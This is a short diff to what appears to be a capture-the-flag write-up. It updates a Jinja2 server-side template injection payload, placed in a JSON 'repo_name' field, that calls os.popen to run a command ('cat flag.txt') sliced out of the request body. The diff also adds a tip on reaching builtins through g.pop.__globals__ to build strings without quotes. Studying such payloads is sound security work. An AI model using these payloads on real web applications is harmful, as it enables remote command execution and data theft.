@@ -6,10 +6,12 @@ Pretty much any of the payloads [here](https://github.com/swisskyrepo/PayloadsAl
 ```
 [
     {
-        "repo_name": "{{lipsum.__globals__.os.popen(request.form.blob[181:186]).read()}}",
+        "repo_name": "{{lipsum.__globals__.os.popen(request.form.blob[181:193]).read()}}",
         "flaky_tests": 9001,
         "prs_blocked": 2,
-        "time_lost": "cat *"
+        "time_lost": "cat flag.txt"
     }
 ]
 ```
+
+Instead of using `request.form.blob` to get the payload, you can also recover builtins with e.g. `g.pop.__globals__.__builtins__.chr` and create a string that way.
